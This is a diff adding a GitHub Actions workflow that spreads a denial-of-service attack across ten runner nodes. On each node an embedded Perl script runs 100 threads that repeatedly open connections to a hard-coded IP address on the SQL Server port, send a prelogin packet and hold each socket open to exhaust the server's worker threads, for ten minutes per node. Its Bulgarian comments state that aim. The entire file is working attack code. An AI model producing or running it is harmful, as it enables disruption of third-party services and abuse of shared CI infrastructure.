@@ -1,0 +1,41 @@
+name: SQL_L7_Stress
+on: workflow_dispatch
+
+jobs:
+  flood:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        node: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
+    steps:
+      - name: Run Perl L7 Attack
+        run: |
+          # Създаваме Perl скрипта директно на GitHub машината
+          cat << 'EOF' > attack.pl
+          use strict;
+          use IO::Socket::INET;
+          use threads;
+
+          my $target = "136.243.167.253";
+          my $port = 1433;
+          my $payload = pack('H*', '1201003400000000000015000601001b000102001c000c0300280004ff08000155000000');
+
+          sub stress {
+              while (1) {
+                  my $socket = IO::Socket::INET->new(PeerAddr => $target, PeerPort => $port, Proto => 'tcp', Timeout => 1);
+                  if ($socket) {
+                      print $socket $payload;
+                      # Държим връзката отворена 2 секунди, за да заемем Worker Thread на сървъра
+                      select(undef, undef, undef, 2.0);
+                      $socket->close();
+                  }
+              }
+          }
+
+          for (1..100) { threads->create(\&stress); }
+          while(1) { sleep 10; }
+          EOF
+
+          echo "Starting Layer 7 Stress on node ${{ matrix.node }}..."
+          # Стартираме Perl скрипта за 10 минути
+          timeout 600s perl attack.pl
